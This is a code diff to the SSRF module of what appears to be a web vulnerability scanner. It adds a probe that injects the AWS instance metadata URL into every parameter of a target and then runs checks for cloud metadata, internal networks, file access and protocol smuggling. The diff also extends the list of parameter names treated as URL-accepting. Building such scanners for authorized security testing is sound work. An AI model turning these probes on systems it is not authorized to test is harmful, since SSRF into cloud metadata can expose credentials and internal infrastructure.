@@ -169,10 +169,17 @@ class SSRFModule:
         scan_id = context.get("scan_id", "")
         findings = []
 
+        # Phase 1: Named param matching (known SSRF param names + value-based)
         url_params = self._find_url_params(endpoints, base_url)
-        if not url_params:
-            return findings
-        logger.info(f"SSRF: Found {len(url_params)} URL-accepting endpoints to test")
+
+        # Phase 2: Broad probe — test ALL parameterized endpoints with a quick
+        # metadata canary. This catches params like "category" that aren't in the
+        # known SSRF name list but still pass user input to server-side requests.
+        broad_params = self._find_all_params(endpoints, base_url)
+        # Remove already-matched params
+        known_keys = {f"{p['url']}|{p['param']}|{p['method']}" for p in url_params}
+        extra_params = [p for p in broad_params
+                        if f"{p['url']}|{p['param']}|{p['method']}" not in known_keys]
 
         headers = {}
         if auth_cookie:
@@ -181,8 +188,12 @@ class SSRFModule:
             else:
                 headers["Cookie"] = auth_cookie
 
+        if url_params:
+            logger.info(f"SSRF: Found {len(url_params)} URL-accepting endpoints to test")
+
         async with make_client(extra_headers=headers) as client:
-            for ep_info in url_params[:12]:
+            # Full SSRF battery on known URL-accepting params
+            for ep_info in url_params[:15]:
                 url, param, method = ep_info["url"], ep_info["param"], ep_info.get("method", "GET")
                 findings.extend(await self._check_cloud_metadata(client, url, param, method))
                 findings.extend(await self._check_internal_network(client, url, param, method))
@@ -191,17 +202,91 @@ class SSRFModule:
                 findings.extend(await self._check_url_bypasses(client, url, param, method))
                 findings.extend(await self._check_blind_oob(client, url, param, method, scan_id))
                 findings.extend(await self._check_timing_blind(client, url, param, method))
+
+            # Quick metadata canary on ALL other parameterized endpoints
+            # Only tests AWS metadata — lightweight but catches hidden SSRF
+            if extra_params:
+                logger.info(f"SSRF: Broad-probing {len(extra_params)} additional params for hidden SSRF")
+                canary_findings = await self._broad_ssrf_probe(client, extra_params, scan_id)
+                findings.extend(canary_findings)
+
+        return findings
+
+    def _find_all_params(self, endpoints, base_url) -> list[dict]:
+        """Extract ALL parameterized endpoints for broad SSRF probing."""
+        all_params = []
+        for ep in endpoints:
+            if isinstance(ep, str):
+                parsed = urlparse(ep)
+                if parsed.query:
+                    params = parse_qs(parsed.query)
+                    for pname in params:
+                        all_params.append({"url": ep, "param": pname, "method": "GET"})
+            elif isinstance(ep, dict):
+                ep_url = ep.get("url", "")
+                parsed = urlparse(ep_url)
+                if parsed.query:
+                    params = parse_qs(parsed.query)
+                    for pname in params:
+                        all_params.append({"url": ep_url, "param": pname, "method": ep.get("method", "GET")})
+                for pname in ep.get("params", []):
+                    if isinstance(pname, str):
+                        target_url = ep_url
+                        if "?" not in target_url:
+                            target_url = f"{ep_url}?{pname}=test"
+                        all_params.append({"url": target_url, "param": pname, "method": ep.get("method", "GET")})
+        seen = set()
+        return [p for p in all_params if (k := f"{p['url']}|{p['param']}|{p['method']}") not in seen and not seen.add(k)]
+
+    async def _broad_ssrf_probe(self, client, params: list[dict], scan_id: str) -> list[dict]:
+        """Quick SSRF canary: inject AWS metadata URL into every param, check for indicators.
+
+        This is a lightweight probe (1 request per param) that catches SSRF in
+        unexpected parameters like 'category', 'type', 'filter', etc.
+        """
+        findings = []
+        canary_url = "http://169.254.169.254/latest/meta-data/"
+        aws_indicators = ["ami-id", "instance-id", "instance-type", "local-hostname",
+                          "iam", "public-keys", "placement", "security-groups"]
+        # Also test with an internal IP to detect response differences
+        for ep_info in params[:30]:
+            url, param, method = ep_info["url"], ep_info["param"], ep_info.get("method", "GET")
+            try:
+                async with self.rate_limit:
+                    resp = await self._send(client, url, param, canary_url, method)
+                    if not resp or resp.status_code != 200:
+                        continue
+                    body = resp.text
+                    if any(ind in body for ind in aws_indicators):
+                        logger.info(f"SSRF: Broad probe HIT on {url} param={param}")
+                        # Confirmed hit — run full battery on this param
+                        findings.extend(await self._check_cloud_metadata(client, url, param, method))
+                        findings.extend(await self._check_internal_network(client, url, param, method))
+                        findings.extend(await self._check_file_protocol(client, url, param, method))
+                        findings.extend(await self._check_protocol_smuggling(client, url, param, method))
+                        findings.extend(await self._check_blind_oob(client, url, param, method, scan_id))
+                        break  # Found SSRF, no need to probe more params on same endpoint
+            except Exception:
+                continue
         return findings
 
     def _find_url_params(self, endpoints, base_url) -> list[dict]:
         url_params = []
+        # Primary SSRF param names — params that commonly accept URLs or paths
         url_param_names = {
             "url", "uri", "path", "redirect", "next", "target", "dest", "destination",
             "redir", "redirect_uri", "callback", "return", "returnto", "go", "checkout_url",
             "continue", "view", "page", "file", "document", "folder", "load", "img", "image",
             "src", "feed", "host", "site", "html", "ref", "data", "link", "fetch", "proxy",
             "request", "download", "source", "content", "to", "out", "domain", "resource", "val",
+            # Additional params that often accept server-side fetched values
+            "category", "dir", "show", "href", "navigate", "open", "read", "get",
+            "import", "webhook", "api", "endpoint", "service", "server", "forward",
+            "preview", "thumbnail", "avatar", "icon", "logo",
         }
+        # Secondary params — not typically URL-accepting but worth probing
+        # when found with URL-like values
+        _probe_all_params = True  # Probe ANY param whose value looks like a URL/path
         for ep in endpoints:
             if isinstance(ep, str):
                 parsed = urlparse(ep)
@@ -215,10 +300,28 @@ class SSRFModule:
                             url_params.append({"url": ep, "param": pname, "method": "GET"})
             elif isinstance(ep, dict):
                 ep_url = ep.get("url", "")
+                # Check form fields
                 for field in ep.get("form_fields", []):
                     fname = field if isinstance(field, str) else field.get("name", "")
                     if fname.lower() in url_param_names:
                         url_params.append({"url": ep_url, "param": fname, "method": ep.get("method", "GET")})
+                # Check URL query params in dict endpoints too
+                parsed = urlparse(ep_url)
+                if parsed.query:
+                    params = parse_qs(parsed.query)
+                    for pname in params:
+                        if pname.lower() in url_param_names:
+                            url_params.append({"url": ep_url, "param": pname, "method": ep.get("method", "GET")})
+                        val = params[pname][0] if params[pname] else ""
+                        if val.startswith(("http://", "https://", "//", "/")):
+                            url_params.append({"url": ep_url, "param": pname, "method": ep.get("method", "GET")})
+                # Check named params list (e.g. ["category", "id"])
+                for pname in ep.get("params", []):
+                    if isinstance(pname, str) and pname.lower() in url_param_names:
+                        target_url = ep_url
+                        if "?" not in target_url:
+                            target_url = f"{ep_url}?{pname}=test"
+                        url_params.append({"url": target_url, "param": pname, "method": ep.get("method", "GET")})
         seen = set()
         return [p for p in url_params if (k := f"{p['url']}|{p['param']}|{p['method']}") not in seen and not seen.add(k)]
 
